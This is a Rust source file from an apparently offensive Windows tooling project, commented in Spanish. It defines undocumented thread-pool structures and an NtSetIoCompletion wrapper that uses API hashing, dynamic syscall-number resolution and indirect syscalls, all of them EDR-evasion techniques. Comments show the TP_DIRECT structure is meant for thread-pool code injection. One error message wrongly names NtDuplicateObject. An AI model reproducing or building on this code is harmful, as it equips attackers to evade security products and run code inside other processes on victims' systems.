use crate::techniques::evasion::execution::dinamic_ssn::get_dinamic_ssn;
use crate::techniques::evasion::execution::indirect_syscall::indirect_syscall_6;
use crate::nt::types::*;

//https://ntdoc.m417z.com/ntsetiocompletion

#[repr(C)]
#[derive(Debug, Copy, Clone)]
pub struct TP_TASK_CALLBACKS {
    pub execute_callback: PVOID,
    pub unposted: PVOID,
}

#[repr(C)]
#[derive(Debug, Copy, Clone)]
pub struct TP_TASK {
    pub callbacks: *mut TP_TASK_CALLBACKS,
    pub numa_node: ULONG,
    pub ideal_processor: UINT8,
    pub _padding: [u8; 3], // o [i8; 3] / [u8; 3]
    pub list_entry: LIST_ENTRY,
}

//TP_DIRECT NO esta documentado, esto me ha dado muchos problemas
#[repr(C)]
pub struct TP_DIRECT { // esta struct se pasa a KeyCOntext, esta era mi ultima confusion, antes se lo pasaba a apccontext
    pub task: TP_TASK,
    pub lock: ULONGLONG,
    pub io_completion_information_list: LIST_ENTRY,
    pub callback: PVOID,  //direccion codigo
    pub numa_node: ULONG,           // indica qué nodo NUMA físico debería despacharse preferentemente la tarea, la ram se divide en varios nodos numa, si pones 0 es el nodo por defecto   
    pub ideal_processor: UCHAR,     //que nucleo ejecuta la tarea, 0 si te da igual  
    pub _padding: [u8; 3], //padding explicito para prevenir todos los errores que he tenido
    // Campos adicionales internos según versión de Windows (generalmente con rellenar a 0 es suficiente)
}

impl TP_DIRECT {
    pub fn as_bytes(&self) -> &[u8] {
        unsafe {
            std::slice::from_raw_parts(
                (self as *const Self).cast::<u8>(),
                std::mem::size_of::<Self>(),
            )
        }
    }
}

pub fn nt_set_io_completion(io_completion_handle: HANDLE, key_context: PVOID, apc_context: PVOID, io_status: NTSTATUS, io_status_information: PULONG)-> Result<usize, String>{

    let api_hash = 0x6041e7aa;
    let ssn = get_dinamic_ssn(api_hash)?;

    unsafe {
        let status = indirect_syscall_6(
            api_hash,
            ssn,
            io_completion_handle as usize, //in
            key_context as usize, //in_opt
            apc_context as usize, //in_opt
            io_status as usize, //in
            io_status_information as usize, //in
            0,
            0,
            0,
        );

        match status {
            Ok(0) => Ok(0),
            Ok(code) => Err(format!("NtDuplicateObject devolvió NTSTATUS: {:#X}", code)),
            Err(e) => Err(e),
        }
    }
}